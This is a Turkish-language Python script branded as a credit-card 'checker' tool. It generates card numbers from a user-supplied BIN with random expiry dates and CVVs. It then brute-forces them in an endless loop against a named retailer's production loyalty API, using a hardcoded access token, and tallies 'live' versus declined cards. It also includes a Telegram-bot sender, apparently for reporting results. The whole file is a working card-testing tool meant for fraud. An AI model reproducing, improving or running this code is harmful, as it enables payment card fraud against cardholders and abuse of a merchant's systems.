import os
import random
import requests
from colorama import Fore, Style, init
import time

# Colorama başlat
init(autoreset=True)

# Kırmızı Ejderha ASCII Sanatı
ascii_logo = f"""{Fore.RED}
,,
`""*$b..
     ""*$o.
         "$$o.
           "*$$o.
              "$$$o.
                "$$$$bo...       ..o:
                  "$$$$$$$$booocS$$$    ..    ,.
               ".    "*$$$$SP     V$o..o$$. .$$$b
                "$$o. .$$$$$o. ...A$$$$$$$$$$$$$$b
          ""bo.   "*$$$$$$$$$$$$$$$$$$$$P*$$$$$$$$:
             "$$.    V$$$$$$$$$P"**""*"'   VP  * "l
               "$$$o.4$$$$$$$$X
                "*$$$$$$$$$$$$$AoA$o..oooooo..           .b
                       .X$$$$$$$$$$$P""     ""*oo,,     ,$P
                      $$P""V$$$$$$$:    .        ""*"
                    .*"    A$$$$$$$$o.4;      .
                         .oP""   "$$$$$$b.  .$;
                                  A$$$$$$$$$$P
                                  "  "$$$$$P"
                                      $$P*"
  MORALESTOOL        .$"
                                     "
{Style.RESET_ALL}"""

print(ascii_logo)

# Rastgele kart bilgisi üretme
def generate_random_cc(bin_code, year=None, month=None, cvv=None):
    exp_year = year if year else str(random.randint(2025, 2030))  # 2025-2030 arası rastgele yıl
    exp_month = month if month else str(random.randint(1, 12)).zfill(2)
    cvv_code = cvv if cvv else "000"  # CVV boşsa 000 kullan
    card_number = bin_code + ''.join(str(random.randint(0, 9)) for _ in range(16 - len(bin_code)))
    return f"{card_number}|{exp_year}|{exp_month}|{cvv_code}"

# Telegram'a mesaj gönderme
def send_telegram_message(message, bot_token, chat_id):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": message}
        response = requests.post(url, data=data, timeout=15)

        if response.status_code == 200:
            print(f"{Fore.GREEN}✅ Mesaj başarıyla gönderildi!")
            return True
        else:
            print(f"{Fore.RED}❌ Telegram API hata kodu: {response.status_code}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}❌ Mesaj gönderme başarısız oldu: {e}")
        return False

# API İsteği Gönderme
def api_request(card_number, month, year, cvv):
    url = f"https://mpecom-apigw-prod.boyner.com.tr/mobile2/mbOrder/GetRetrieveLoyalties?CardNo={card_number}&ExpMonth={month}&ExpYear=20{year}&SecureCode={cvv}"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
        "Accept": "*/*",
        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
        "api-version": "5",
        "appversion": "0.1.0",
        "content-type": "application/x-www-form-urlencoded",
        "ismarketplace": "true",
        "osversion": "1",
        "phonetype": "1",
        "platform": "1",
        "storeid": "1",
        "token": "c55f50bb-03e9-49ac-98b0-950761391979",
        "x-is-web": "true",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    }
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.json()
        else:
            print(f"{Fore.RED}❌ Hata! API isteği başarısız oldu: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}❌ API isteği sırasında hata oluştu: {e}")
        return None

# Kullanıcı girişleri
if __name__ == "__main__":
    print(Fore.RED + "CC KARTI DÜŞÜRÜCÜ TOOL CR/Morraless7")
    print(Fore.RED + "_________________________________")

    bot_token = input(f"{Fore.GREEN}Bot Token Gir: {Fore.WHITE}")
    chat_id = input(f"{Fore.GREEN}Chat ID Gir: {Fore.WHITE}")
    secim_ay = input(f"{Fore.GREEN}Ay Gir (MM) (Boş bırakılırsa rastgele): {Fore.WHITE}") or None
    secim_yil = input(f"{Fore.GREEN}Yıl Gir (YYYY) (Boş bırakılırsa 2025-2030 arası): {Fore.WHITE}") or None

    # Bin girişi zorunlu kıl
    while True:
        bin_kodu = input(f"{Fore.GREEN}6-8 Haneli BIN Gir: {Fore.WHITE}")
        if bin_kodu.isdigit() and len(bin_kodu) in [6, 8]:
            break
        print(f"{Fore.RED}❌ Bin Girmek Zorunlu! 6 veya 8 haneli bir bin girin.")

    cvv_kodu = input(f"{Fore.GREEN}CVV Gir (Boş bırakılırsa 000): {Fore.WHITE}") or "000"

    print(f"{Fore.YELLOW}Canlı Kart Aranıyor...\n")
    
    live_count = 0
    dec_count = 0

    while True:
        kart = generate_random_cc(bin_kodu, secim_yil, secim_ay, cvv_kodu)
        card_number, exp_year, exp_month, cvv = kart.split('|')

        # API isteği yap
        response_data = api_request(card_number, exp_month, exp_year, cvv)

        # Eğer API'den başarılı sonuç gelirse
        if response_data and response_data.get("status") == "success":
            live_count += 1  # Canlı kart sayısını artır
        else:
            dec_count += 1  # Geçersiz kart sayısını artır

        # Ekranı temizleyerek sayıları güncelle
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.YELLOW}Canlı Kart Aranıyor...\n")
        print(f"✅ 𝐋𝐈𝐕𝐄 𝐊𝐀𝐑𝐓 𝐒𝐀𝐘𝐈𝐒İ: {live_count}")
        print(f"❌ 𝐃𝐄𝐂 𝐊𝐀𝐑𝐓 𝐒𝐀𝐘𝐈𝐒İ: {dec_count}")

        time.sleep(0.3)
      
